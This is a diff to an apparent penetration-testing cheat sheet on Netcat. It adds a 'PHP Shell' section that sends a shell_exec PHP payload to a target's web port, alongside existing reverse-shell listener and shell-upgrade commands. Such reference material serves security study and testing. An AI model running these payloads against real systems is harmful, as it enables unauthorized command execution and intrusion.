@@ -1,7 +1,7 @@
 ---
 title: Netcat
 desc: Manages network connections. Also known as 'nc'.
-tags: [ActiveRecon, Linux, PrivEsc, ReverseShell]
+tags: [ActiveRecon, Linux, PrivEsc, ReverseShell, Web]
 alts: [Ncat, Telnet]
 website:
 render_with_liquid: false
@@ -50,4 +50,13 @@ nc -lvnp 4444
 $ SHELL=/bin/bash script -q /dev/null
 # or
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+<br />
+
+## PHP Shell
+
+```sh
+nc <target-ip> 80
+<?php echo shell_exec('whoami') ?>
 ```
